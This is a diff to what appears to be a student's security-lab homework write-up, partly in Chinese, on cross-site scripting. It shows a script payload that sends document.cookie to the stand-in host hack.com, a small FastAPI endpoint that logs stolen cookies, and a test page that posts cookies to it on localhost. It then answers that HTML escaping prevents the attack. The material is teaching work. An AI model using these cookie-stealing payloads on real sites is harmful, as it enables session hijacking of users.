@@ -262,6 +262,36 @@ php-template
 ```
 <script>document.location="https://hack.com/steal?cookie="+document.cookie</script>
 ```
+xsstest.py
+```
+from fastapi import FastAPI
+
+app=FastAPI()
+
+@app.get("/log")
+def log(cookie: str):
+    print("被偷的 Cookie:", cookie)
+    return{"status": "ok"}
+```
+xsstest.html
+```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS test</title>
+</head>
+<body>
+<script>
+fetch("http://127.0.0.1:8000/log?cookie="+document.cookie)
+
+</script>
+    
+</body>
+</html>
+```
+![task5-2](week8/task5/task5-2.png)
 
 Q5-3: Based on the scenario you did in the previous step, how could it be prevented? <br>
 A5-3:利用HTML Escape (又稱為跳脫字元，意即將具有特殊語義的字符(如<、>、&)轉換成其對應的轉義字元(如 &lt;、&gt;、&amp;)) 把內容轉換成純文字，而不是程式碼。如下範例
